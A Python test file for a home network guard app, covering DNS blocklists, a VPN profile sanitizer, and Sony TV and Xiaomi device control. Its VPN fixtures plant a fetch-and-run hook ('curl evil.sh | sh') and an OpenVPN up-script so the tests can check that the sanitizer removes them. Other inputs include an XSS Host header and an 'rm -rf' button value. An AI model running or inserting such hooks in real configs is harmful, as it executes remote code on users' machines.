import os
import socket
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
os.environ["HG_DB"] = str(Path(tempfile.mkdtemp()) / "t.db")
os.environ["HG_DEMO"] = "1"

from dnslib import QTYPE, DNSRecord
from fastapi.testclient import TestClient

from homeguard import api, blocklists, db, demo, devices, dns_server


def setup_module(_):
    db.reset_for_tests()
    demo.seed()


def test_levels():
    assert blocklists.check("doubleclick.net", "basic") == (True, "ads")
    assert blocklists.check("x.y.doubleclick.net", "basic") == (True, "ads")  # поддомены
    assert blocklists.check("google-analytics.com", "basic") == (False, None)
    assert blocklists.check("google-analytics.com", "medium") == (True, "trackers")
    assert blocklists.check("blocked-malware.test", "medium") == (True, "malware")
    assert blocklists.check("evil.zip", "medium") == (False, None)
    assert blocklists.check("evil.zip", "strict") == (True, "suspicious_tld")
    assert blocklists.check("dns.google", "strict") == (True, "doh")
    assert blocklists.check("doubleclick.net", "off") == (False, None)
    assert blocklists.check("notdoubleclick.net", "strict") == (False, None)


def test_device_guess():
    assert devices.guess_type("BRAVIA-KD-55X80", "Sony") == "tv"
    assert devices.guess_type("MacBook-Air-Evelina", None) == "computer"
    assert devices.guess_type(None, None, is_gateway=True) == "router"
    assert devices.guess_type("yandexmicro-LR0000", None) == "speaker"
    assert devices.vendor_of("F8:A4:5F:00:00:00") == "Xiaomi"


def test_dns_blocking_end_to_end():
    db.set_setting("level", "medium")
    server = dns_server.start("127.0.0.1", 15353,
                              dns_server.FilteringResolver(upstream="127.0.0.1", block_ip="10.0.0.5"))
    try:
        raw = DNSRecord.question("ads.doubleclick.net").send("127.0.0.1", 15353, timeout=3)
        r = DNSRecord.parse(raw)
        assert [str(x.rdata) for x in r.rr if x.rtype == QTYPE.A] == ["10.0.0.5"]
    finally:
        server.stop()
    row = db.query("SELECT * FROM queries WHERE domain='ads.doubleclick.net'")[0]
    assert row["action"] == "blocked" and row["reason"] == "ads"


def test_api():
    c = TestClient(api.app, base_url="http://127.0.0.1:8080")
    devs = c.get("/api/devices").json()
    assert devs[0]["is_self"] and len(devs) == 9
    mac = devs[1]["mac"]
    assert c.patch(f"/api/devices/{mac}", json={"name": "Телефон Али", "type": "phone"}).status_code == 200
    assert c.patch(f"/api/devices/{mac}", json={"type": "bogus"}).status_code == 400
    assert c.put("/api/settings", json={"level": "strict"}).status_code == 200
    assert c.get("/api/settings").json()["level"] == "strict"
    assert c.put("/api/settings", json={"level": "nope"}).status_code == 400
    assert c.get("/api/stats").json()["queries_24h"] > 0
    assert all(q["action"] == "blocked" for q in c.get("/api/queries?blocked=true").json())


def test_block_page_served_for_foreign_host():
    c = TestClient(api.app, base_url="http://blocked-malware.test")
    r = c.get("/some/path")
    assert r.status_code == 403
    assert "blocked-malware.test" in r.text and "Вредоносный сайт" in r.text
    assert c.get("/static/blocked.mp4").status_code == 200
    # XSS через Host не проходит
    r = TestClient(api.app).get("/", headers={"host": "a<script>.test"})
    assert "<script>" not in r.text


# ---------------- VPN ----------------
from homeguard import vpn as vpnmod

WG = """[Interface]
PrivateKey = AAAA
Address = 10.0.0.2/32
DNS = 1.1.1.1
PostUp = curl evil.sh | sh
[Peer]
PublicKey = BBBB
Endpoint = nl-1.example.com:51820
AllowedIPs = 0.0.0.0/0
"""
OVPN = """client
dev tun
remote de1.example.com 1194
script-security 2
up /tmp/evil.sh
auth-user-pass
<ca>
-----BEGIN CERTIFICATE-----
up not-a-directive-inside-block
-----END CERTIFICATE-----
</ca>
"""


def _mgr(tmp_path):
    from homeguard import config
    config.VPN_DIR = tmp_path
    return vpnmod.VpnManager(vpnmod.Runner(dry_run=True))


def test_vpn_sanitize_strips_dangerous_lines():
    text, ep = vpnmod.sanitize("wireguard", WG)
    assert "PostUp" not in text and "DNS" not in text and ep == "nl-1.example.com:51820"
    text, ep = vpnmod.sanitize("openvpn", OVPN)
    assert "script-security" not in text and "\nup /tmp" not in text
    assert "up not-a-directive-inside-block" in text  # внутри <ca> не трогаем
    assert ep == "de1.example.com:1194"


def test_vpn_rejects_garbage():
    for bad in ("hello", "[Interface]\n[Peer]\n"):
        try:
            vpnmod.sanitize(vpnmod.detect_kind(bad), bad)
        except vpnmod.VpnError:
            continue
        raise AssertionError("должно быть отклонено")


def test_vpn_connect_switch_disconnect(tmp_path):
    m = _mgr(tmp_path)
    a = m.add_profile("Планета NL", WG)
    b = m.add_profile("Планета DE", OVPN, username="u", password="p")
    assert a["country"] == "NL" and a["flag"] == "🇳🇱" and b["country"] == "DE" and b["has_auth"]
    assert oct((tmp_path / f"{a['id']}.conf").stat().st_mode & 0o777) == "0o600"
    m.set_kill_switch(True)
    m.connect(a["id"])
    cmds = [" ".join(c) for c in m.runner.history]
    assert any(c.startswith("wg-quick up") for c in cmds)
    assert any("MASQUERADE" in c and "-A" in c for c in cmds)
    assert any("! -o hgvpn -j DROP" in c for c in cmds)  # kill switch
    assert m.status()["state"] == "connected"
    m.runner.history.clear()
    m.connect(b["id"])  # переключение: старые правила и туннель снимаются
    cmds = [" ".join(c) for c in m.runner.history]
    assert any("-D POSTROUTING" in c for c in cmds) and any(c.startswith("openvpn") for c in cmds)
    assert any("--auth-user-pass" in c for c in cmds)
    m.disconnect()
    assert m.status()["state"] == "disconnected"
    m.delete_profile(a["id"])
    assert not (tmp_path / f"{a['id']}.conf").exists()


def test_vpn_api_and_password(tmp_path, monkeypatch):
    from homeguard import config
    monkeypatch.setattr(vpnmod, "manager", _mgr(tmp_path))
    c = TestClient(api.app, base_url="http://127.0.0.1:8080")
    r = c.post("/api/vpn/profiles", json={"name": "Финляндия", "content": WG})
    assert r.status_code == 200 and "PrivateKey" not in r.text
    pid = r.json()["id"]
    assert c.post("/api/vpn/profiles", json={"name": "x", "content": "junk"}).status_code == 400
    assert c.post("/api/vpn/connect", json={"id": pid}).json()["state"] == "connected"
    assert c.post("/api/vpn/connect", json={"id": "nope"}).status_code == 400
    assert c.put("/api/vpn/settings", json={"kill_switch": True}).json()["kill_switch"] is True
    monkeypatch.setattr(config, "PASSWORD", "secret")
    assert c.get("/api/vpn").status_code == 401
    assert c.get("/api/vpn", auth=("me", "secret")).status_code == 200
    assert c.get("/api/vpn", auth=("me", "wrong")).status_code == 401
    # страница блокировки пароля не требует
    assert TestClient(api.app, base_url="http://blocked-malware.test").get("/").status_code == 403


# ---------------- Bravia ----------------
sys.path.insert(0, str(Path(__file__).resolve().parent))
import fake_bravia
from homeguard import bravia, config as hgconfig


def _tv_server(monkeypatch):
    st = fake_bravia.make_state()
    srv = fake_bravia.serve(st)
    monkeypatch.setattr(hgconfig, "BRAVIA_PORT", srv.server_address[1])
    return st, srv


def test_bravia_ip_must_be_local():
    for bad in ("8.8.8.8", "example.com", "0.0.0.0", "::1"):
        try:
            bravia.check_ip(bad)
        except bravia.BraviaError:
            continue
        raise AssertionError(bad)
    assert bravia.check_ip("192.168.3.30") == "192.168.3.30"


def test_bravia_client(monkeypatch):
    st, srv = _tv_server(monkeypatch)
    tv = bravia.Bravia("127.0.0.1", "1234", port=srv.server_address[1])
    assert tv.power() and tv.info()["model"] == "KD-55X80J"
    tv.set_volume(30); tv.set_mute(True)
    assert tv.volume() == {"volume": 30, "mute": True, "min": 0, "max": 100}
    assert [i["title"] for i in tv.inputs()] == ["HDMI 1", "HDMI 2"]
    tv.set_input("extInput:hdmi?port=2"); assert st.input.endswith("2")
    tv.launch_app("com.sony.dtv.com.netflix.ninja"); assert "netflix" in st.app
    tv.press("Home"); assert st.pressed == ["AAA-Home"]
    tv.set_power(False); assert tv.power() is False
    try:
        bravia.Bravia("127.0.0.1", "wrong", port=srv.server_address[1]).power()
    except bravia.BraviaError as e:
        assert "Pre-Shared Key" in str(e)
    else:
        raise AssertionError
    srv.shutdown()


def test_bravia_api(monkeypatch):
    st, srv = _tv_server(monkeypatch)
    c = TestClient(api.app, base_url="http://127.0.0.1:8080")
    r = c.post("/api/tvs", json={"name": "Гостиная", "ip": "127.0.0.1", "psk": "1234"})
    assert r.status_code == 200 and "psk" not in r.text
    tid = r.json()["id"]
    assert "psk" not in c.get("/api/tvs").text
    assert c.post("/api/tvs", json={"name": "x", "ip": "8.8.8.8", "psk": "1"}).status_code == 400
    s = c.get(f"/api/tvs/{tid}/state").json()
    assert s["power"] and s["audio"]["volume"] == 12
    assert c.post(f"/api/tvs/{tid}/volume", json={"level": 40}).status_code == 200 and st.volume == 40
    assert c.post(f"/api/tvs/{tid}/power", json={"on": False}).status_code == 200
    assert c.get(f"/api/tvs/{tid}/state").json() == {"power": False}
    assert c.post(f"/api/tvs/{tid}/power", json={"on": True}).status_code == 200
    assert c.post(f"/api/tvs/{tid}/press", json={"button": "Up"}).status_code == 200
    assert c.post(f"/api/tvs/{tid}/press", json={"button": "rm -rf"}).status_code == 400
    assert c.get(f"/api/tvs/{tid}/apps").json()[0]["title"] == "YouTube"
    srv.shutdown()
    assert c.get(f"/api/tvs/{tid}/state").status_code == 502  # ТВ недоступен
    assert c.get("/api/tvs/nope/state").status_code == 404
    c.delete(f"/api/tvs/{tid}")


# ---------------- Xiaomi (miIO / MIoT) ----------------
import json as _json
import shutil
import fake_miio
from homeguard import miio as miiomod, miot as miotmod

TOKEN = "00112233445566778899aabbccddeeff"


def _miot_env(monkeypatch, tmp_path):
    cache = tmp_path / "miot"
    cache.mkdir()
    shutil.copy(Path(__file__).parent / "fixtures" / "mibx2.washer.v1.json", cache / "mibx2.washer.v1.json")
    monkeypatch.setattr(hgconfig, "MIOT_DIR", cache)
    washer = fake_miio.Washer()
    handle = fake_miio.serve(washer, TOKEN)
    monkeypatch.setattr(hgconfig, "MIIO_PORT", handle.port)
    return washer, handle


def test_miio_crypto_roundtrip():
    tok = bytes.fromhex(TOKEN)
    assert miiomod.decrypt(tok, miiomod.encrypt(tok, b'{"a":1}')) == b'{"a":1}'


def test_miio_client_and_wrong_token(monkeypatch, tmp_path):
    washer, h = _miot_env(monkeypatch, tmp_path)
    dev = miiomod.MiioDevice("127.0.0.1", TOKEN, port=h.port, timeout=0.5, retries=0)
    assert dev.info()["model"] == "mibx2.washer.v1"
    assert dev.get_properties([(2, 2), (2, 10)]) == {(2, 2): 1, (2, 10): 0}
    bad = miiomod.MiioDevice("127.0.0.1", "ff" * 16, port=h.port, timeout=0.4, retries=0)
    try:
        bad.info()
    except miiomod.MiioError as e:
        assert "не отвечает" in str(e)
    else:
        raise AssertionError
    h.close()


def test_miot_spec_and_validation(monkeypatch, tmp_path):
    _miot_env(monkeypatch, tmp_path)
    spec = miotmod.load_spec("mibx2.washer.v1")
    by = {(p["siid"], p["piid"]): p for p in spec["properties"]}
    assert by[(2, 2)]["label"] == "Состояние" and by[(2, 2)]["writable"] is False
    assert {"label": "Идёт стирка", "value": 3} in by[(2, 2)]["values"]
    assert not any(p["service"] == "device-information" for p in spec["properties"])
    assert miotmod.validate_value(by[(2, 7)], 4) == 4
    for bad in (99, "4", True, 1.5):
        try:
            miotmod.validate_value(by[(2, 7)], bad)
        except miotmod.MiotError:
            continue
        raise AssertionError(bad)
    assert [a["name"] for a in spec["actions"] if a["siid"] == 2] == ["start-wash", "pause"]


def test_home_api(monkeypatch, tmp_path):
    washer, h = _miot_env(monkeypatch, tmp_path)
    c = TestClient(api.app, base_url="http://127.0.0.1:8080")
    assert c.post("/api/home", json={"name": "x", "ip": "127.0.0.1", "token": "zz"}).status_code == 400
    assert c.post("/api/home", json={"name": "x", "ip": "8.8.8.8", "token": TOKEN}).status_code == 400
    r = c.post("/api/home", json={"name": "Стиралка", "ip": "127.0.0.1", "token": TOKEN})
    assert r.status_code == 200 and r.json()["model"] == "mibx2.washer.v1" and TOKEN not in r.text
    did = r.json()["id"]
    assert TOKEN not in c.get("/api/home").text
    st = c.get(f"/api/home/{did}/state").json()
    assert st["2.2"] == 1 and st["2.7"] == 4
    assert c.post(f"/api/home/{did}/set", json={"siid": 2, "piid": 7, "value": 6}).status_code == 200
    assert washer.props[(2, 7)] == 6
    assert c.post(f"/api/home/{did}/set", json={"siid": 2, "piid": 7, "value": 12345}).status_code == 400
    assert c.post(f"/api/home/{did}/set", json={"siid": 2, "piid": 2, "value": 3}).status_code == 400  # read-only
    assert c.post(f"/api/home/{did}/set", json={"siid": 9, "piid": 9, "value": 1}).status_code == 400  # нет в спеке
    assert c.post(f"/api/home/{did}/action", json={"siid": 2, "aiid": 1}).status_code == 200
    assert washer.actions == [(2, 1)] and c.get(f"/api/home/{did}/state").json()["2.2"] == 3
    assert c.post(f"/api/home/{did}/action", json={"siid": 2, "aiid": 77}).status_code == 400
    h.close()
    assert c.get(f"/api/home/{did}/state").status_code == 502
    c.delete(f"/api/home/{did}")
